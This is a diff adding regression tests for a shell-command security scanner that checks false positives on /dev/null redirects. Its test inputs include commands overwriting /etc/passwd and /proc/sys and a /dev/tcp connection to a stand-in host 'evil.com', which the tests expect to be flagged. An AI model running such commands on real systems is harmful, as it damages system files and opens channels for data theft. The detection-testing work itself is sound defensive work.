@@ -77,3 +77,19 @@ class TestQuarantineChecker:
         evidence = checker.check(text, ctx)
         # Should be unknown due to low severity
         assert evidence.conclusion.value in {"PASS", "UNKNOWN"}
+
+
+class TestWriteSystemPathFalsePositive:
+    """Regression: `>/dev/null` must never flag — it's ubiquitous and benign."""
+
+    def test_dev_null_is_safe(self):
+        assert scan("verdict build >/dev/null 2>&1") == []
+        assert scan("cat x >/dev/stderr") == []
+        assert scan("exec 2>&1 >/dev/null") == []
+
+    def test_real_system_writes_still_flag(self):
+        assert any(f.category == "write-system-path" for f in scan("echo x > /etc/passwd"))
+        assert any(f.category == "write-system-path" for f in scan("echo x > /proc/sys/vm/x"))
+
+    def test_dev_tcp_is_exfil(self):
+        assert any(f.category == "dev-tcp-exfil" for f in scan("exec 3>/dev/tcp/evil.com/443"))
